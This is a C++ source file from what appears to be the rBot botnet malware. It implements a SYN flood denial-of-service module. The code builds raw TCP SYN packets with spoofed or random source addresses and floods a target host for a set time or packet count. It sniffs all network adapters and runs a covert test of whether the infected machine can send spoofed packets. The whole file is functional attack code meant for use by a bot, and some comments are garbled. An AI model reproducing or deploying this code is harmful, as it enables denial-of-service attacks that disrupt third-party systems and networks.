/* 

rBot - A bot to rule them All 


File: Synflood.cpp

Worklog:
  - None yet.  

*/



#include <ws2tcpip.h>
#include "tcpip.h"


#define MAX_PACK_LEN 65535
#define SIO_RCVALL 0x98000001

#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

 typedef struct synflood {
	 unsigned long remoteHost;
	 unsigned short remotePort;
	 unsigned long seconds;
	 unsigned long sourceIP;
	 unsigned short sport;
	 unsigned long amount;
	 int threadnum;
	 BOOL notice;
	 char msgdest[256];
	 int rand;
 }synflood;

typedef struct _iphdr
{
	unsigned char h_lenver; //4?+4?IP?
	unsigned char tos; //8?TOS
	unsigned short total_len; //16
	unsigned short ident; //16
	unsigned short frag_and_flags; //3
	unsigned char ttl; //8? TTL
	unsigned char proto; //8? (TCP, UDP ?)
	unsigned short checksum; //16?IP?
	unsigned int sourceIP; //32IP
	unsigned int destIP; //32?IP
}IP_HEADER;

typedef struct _tcphdr //TCP
{
	USHORT th_sport; //16
	USHORT th_dport; //16?
	unsigned intth_seq; //32
	unsigned intth_ack; //32
	unsigned char th_lenres; //4?/6
	unsigned char th_flag; //6
	USHORT th_win; //16?
	USHORT th_sum; //16
	USHORT th_urp; //16
}TCP_HEADER;


DWORD WINAPI NewListener(LPVOID parm);
int SendSyn(synflood *sf);
int makepacket(unsigned short dport, unsigned long dip, unsigned long sip, char buf[], int sport=0);
void SniffOnAllAdapters();
void tcpHandle(char *TcpBuf,unsigned long srcip, BOOL isOurIP);
void testSpoofCapable(DWORD dwRemoteHost,unsigned long sip);
DWORD WINAPI SynTarget(LPVOID psf);
unsigned long GenDestIP(unsigned long dstIPbase, unsigned int randomextra);

BOOL bSpoofable=FALSE;
BOOL bRunSniffer=FALSE;



int makepacket(unsigned short dport, unsigned long dip, unsigned long sip, char buf[], int sport)
{
    	IP_HDR             ipHdr;
	TCP_HDR		   tcpHdr;
	PS_HDR		   pseudo_header;
    	unsigned short     iTotalSize,
        	           iIPVersion,
                       	   iIPSize,
                           cksum = 0;    
    	char	           *ptr = NULL;


    	iTotalSize = sizeof(ipHdr) + sizeof(tcpHdr);// + strlen(anyotherdata);
    	iIPVersion = 4;
    	iIPSize = sizeof(ipHdr) / sizeof(unsigned long);

// Setup our IP header
    	ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
    	ipHdr.ip_tos = 0;                         // IP type of service
    	ipHdr.ip_totallength = htons(iTotalSize); // Total packet len
    	ipHdr.ip_id = 1;                 // Unique identifier: set to 0
	ipHdr.ip_offset = 0;             // Fragment offset field
    	ipHdr.ip_ttl = 128;              // Time to live
    	ipHdr.ip_protocol = IPPROTO_TCP; // Protocol(TCP) 
    	ipHdr.ip_checksum = 0 ;          // IP checksum
	ipHdr.ip_srcaddr = sip;		 // Source address
    	ipHdr.ip_destaddr = dip;	 // Destination address

// Setup our TCP header
		if (sport==0) {
    		tcpHdr.sport = htons((rand()%3072)+1024);	 // anything/random
		} else {
			tcpHdr.sport = htons(sport);
		}
		if (dport==0) dport=rand();
    	tcpHdr.dport = htons(dport) ;	 // destination port
	tcpHdr.seqnum = (rand()<<16) + rand();
	tcpHdr.acknum=0;
	tcpHdr.DataOffset=(5) << 4;
// Set SYN flag on.
	tcpHdr.Flags=SYN;
	tcpHdr.Windows=htons(55808);	//Max window size
	tcpHdr.Checksum=0;
	tcpHdr.UrgPointer=0;

// Make pseudo header for checksum
	pseudo_header.source_address = sip;
	pseudo_header.dest_address = dip;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons(sizeof(tcpHdr));
	memcpy(&pseudo_header.tcp,&tcpHdr, sizeof(tcpHdr));

// Calculate checksum
	tcpHdr.Checksum = checksum((unsigned short *)&pseudo_header, sizeof(pseudo_header));

// Fill buffer to send.
	ZeroMemory(buf, sizeof(buf));
	ptr = buf;	
	memcpy(ptr, &ipHdr, sizeof(ipHdr));
	ptr += sizeof(ipHdr);
	memcpy(ptr, &tcpHdr, sizeof(tcpHdr));
	ptr += sizeof(tcpHdr);	

	return 0;
}	

DWORD WINAPI SynTarget(LPVOID psf)
{
	synflood *sf;
	sf=(synflood *)psf;
	SendSyn(sf);
	threads[sf->threadnum]=0;
	threadd[sf->threadnum][0]=0;
	free(sf);

	return 0;
}

int SendSyn(synflood *sf)
{
	SOCKET             s;
	BOOL               bOpt =true;
	int                ret;
   	struct sockaddr_in sin;
   	unsigned char buf[40];		// just enough for ip+tcp with NO DATA!
	unsigned long psip;


// Creating a raw socket
	s = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0,0);

	if (s == INVALID_SOCKET)
	{
        //	printf("WSASocket() failed: %d\n", WSAGetLastError());
        	return -1;
    	}

// Enable the IP header include option 
// Making it raw.
    	ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
    	if (ret == SOCKET_ERROR)
    	{
	      //  printf("setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
	        return -1;
    	}
    	sin.sin_family = AF_INET;
    	sin.sin_port = 0;	//doesnt matter
    	sin.sin_addr.s_addr = sf->remoteHost;	
		
		unsigned long endTime;
		endTime=GetTickCount()+(1000*sf->seconds);
		int j=0;
		psip=sf->sourceIP;
		int sent_packets=0;
		int packets_per_batch=500;
		if (sf->amount) {
			if (packets_per_batch>(sf->amount)) packets_per_batch=sf->amount;
		}

		while (1)
		{
			for (j=0;j<packets_per_batch;j++) {
				if (sf->sourceIP==0) psip=rand()+(rand()<<16);
				if (makepacket(sf->remotePort,GenDestIP(sf->remoteHost,sf->rand),psip,(char *)buf,sf->sport)!=0) return -1;
 				ret = sendto(s, (char *)buf, sizeof(buf), 0, (SOCKADDR *)&sin, sizeof(sin));
			}
			sent_packets+=packets_per_batch;
			if (sf->amount) {
				if (sent_packets>=sf->amount) break;
			} else {	//Its time-based...
				if (GetTickCount() > endTime) break;
			}
			Sleep(1);		//Rate limiting - FIXME: Calculate the time to wait..
		}
		
    	closesocket(s);
    	return 0;
}

unsigned long GenDestIP(unsigned long dstIPbase, unsigned int randomextra)
{
	if (dstIPbase==0) return (rand()+(rand()<<16));
	if ((randomextra==0) || (randomextra==1)) return dstIPbase;
	return dstIPbase+(htonl(rand()%randomextra));
}



/***************** SNIFFING FUNCTIONS *****************************/
DWORD WINAPI NewListener(LPVOID parm)
{
	int iErrorCode;
	char RecvBuf[MAX_PACK_LEN] = {0};
	char *actBuff;
	BOOL isOurIP;
	SOCKET s;
	IP_HEADER *pIpHeader;
	DWORD dwBindIP;
	dwBindIP=(DWORD)parm;

	s = socket(AF_INET , SOCK_RAW , IPPROTO_IP);
	if (s==INVALID_SOCKET) return 0;
	//IP


	SOCKADDR_IN sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(6000);
	sa.sin_addr.S_un.S_addr=dwBindIP;
	//memcpy(&sa.sin_addr.S_un.S_addr, pHostent->h_addr_list[0], pHostent->h_length);
	iErrorCode = bind(s, (PSOCKADDR)&sa, sizeof(sa));

	//SOCK_RAW?SIO_RCVALL,?IP?
	DWORD dwBufferLen[10] ;
	DWORD dwBufferInLen = 1 ;
	DWORD dwBytesReturned = 0 ;
	//
	iErrorCode=WSAIoctl(s, SIO_RCVALL,&dwBufferInLen, sizeof(dwBufferInLen),&dwBufferLen, sizeof(dwBufferLen),&dwBytesReturned , NULL , NULL );

	//IP
	while(bRunSniffer==TRUE)
	{
		memset(RecvBuf, 0, sizeof(RecvBuf));
		iErrorCode = recv(s, RecvBuf, sizeof(RecvBuf), 0);
		if (iErrorCode!=SOCKET_ERROR) {
			pIpHeader = (IP_HEADER *)RecvBuf;
			if ((pIpHeader->destIP==dwBindIP) || (pIpHeader->sourceIP==dwBindIP)) {
				// Its addressed to or from us...
				int iIphLen = sizeof(unsigned long) * (pIpHeader->h_lenver & 0xf);
				actBuff=RecvBuf+iIphLen;
				isOurIP=FALSE;
				if (dwBindIP==pIpHeader->sourceIP) isOurIP=TRUE;
				if (pIpHeader->proto==IPPROTO_TCP) tcpHandle(actBuff,pIpHeader->sourceIP,isOurIP);
			}
		}
	}
	closesocket(s);
	IN_ADDR in;
	in.s_addr=dwBindIP;
	//printf("End sniffer on [%s]\n",inet_ntoa(in));
	return 0;
}

void testSpoofCapable(DWORD dwRemoteHost,unsigned long sip)
{
	unsigned long remoteIP;
	synflood sf;
	remoteIP=sip^SYN_XORVAL;
	memset(&sf,0,sizeof(synflood));
	sf.remotePort=SYN_DPORT;
	sf.remoteHost=dwRemoteHost;
	sf.sourceIP=remoteIP;
	sf.sport=SYN_SPOOF_TEST;
	sf.amount=2;
	SendSyn(&sf);

}

void tcpHandle(char *TcpBuf,unsigned long srcip, BOOL isOurIP)
{
	TCP_HEADER *pTcpHeader;
	pTcpHeader=(TCP_HEADER *)TcpBuf;
	if ((ntohs(pTcpHeader->th_dport)==SYN_DPORT)) {
		//&& (pTcpHeader->th_sport==SYN_DETECT_SPORT)) {
		if (pTcpHeader->th_flag!=0x02) return;	//Its not a syn packet
		switch (ntohs(pTcpHeader->th_sport))
		{
		case SYN_SPOOF_TEST:
			if (isOurIP==FALSE) {
				//Someone has sent us a SPOOF_TEST request.
				//We respond by sending a SYN to the source ip XORED with a constant
				//dest port = SYN_DPORT (as always, for all syn-testing..)
				//And the "command" SYN_SPOOF_GOOD for source port...
				unsigned long realIP;
				synflood sf;
				realIP=srcip^SYN_XORVAL;
				memset(&sf,0,sizeof(synflood));
				sf.amount=2;
				sf.remoteHost=realIP;
				sf.remotePort=SYN_DPORT;
				sf.sport=SYN_SPOOF_GOOD;
				sf.sourceIP=rand()+(rand()<<16);
				SendSyn(&sf);

			}
			break;
		case SYN_SPOOF_GOOD:
			if (isOurIP==FALSE) { //If the message wasn't sent from us...
			//We have recieved a response which says that we CAN send spoofed syn packets :)
				bSpoofable=TRUE;		//then we can spoof
			}
			
			break;
		}
	}
}

void SniffOnAllAdapters()
{
	if (bRunSniffer==TRUE) return;	//(Sniffer is already running).
	char ac[80];
	int i;
	hostent *phe;
	in_addr addr;
	DWORD ThreadID;
	if (gethostname(ac,sizeof(ac))==SOCKET_ERROR) return;
	phe=gethostbyname(ac);
	if (phe==0) return;
	bRunSniffer=TRUE;
	for (i=0; phe->h_addr_list[i]; i++) {
		memcpy(&addr,phe->h_addr_list[i],sizeof(in_addr));
		CreateThread(0,0,&NewListener,(void *)addr.s_addr,0,&ThreadID);
	}
	
}